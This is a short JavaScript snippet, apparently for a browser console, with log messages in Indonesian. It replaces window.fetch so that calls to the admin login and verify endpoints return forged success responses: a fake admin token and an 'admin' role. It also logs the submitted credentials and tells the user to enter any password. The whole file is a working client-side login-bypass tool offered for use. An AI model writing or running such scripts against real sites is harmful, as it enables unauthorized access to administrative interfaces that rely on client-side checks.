// language: JavaScript, file: test_and_see_bypass.js, target: Browser Console
(function() {
    console.log("[*] Memasang Universal Login Interceptor...");

    if (!window.__ORIG_FETCH__) {
        window.__ORIG_FETCH__ = window.fetch;
    }

    window.fetch = async function(resource, init) {
        const url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
        
        if (url.includes('/api/admin/login')) {
            console.log('[+] TRAP TRIGGERED: /api/admin/login berhasil dicegat!');
            console.log('[*] Payload request yang dikirim:', init && init.body);
            return new Response(JSON.stringify({
                success: true,
                token: 'bypassed-admin-token-2026',
                name: 'Super Administrator'
            }), {
                status: 200,
            });
        }

        if (url.includes('/api/admin/verify')) {
            console.log('[+] TRAP TRIGGERED: /api/admin/verify berhasil dicegat!');
            return new Response(JSON.stringify({
                valid: true,
                name: 'Super Administrator',
                role: 'admin'
            }), {
                status: 200,
            });
        }

        return window.__ORIG_FETCH__.apply(this, arguments);
    };

    console.log("[+] Berhasil! Sekarang ketik password apa saja di form login lalu klik tombol Masuk. Perhatikan log di konsol ini.");
})();
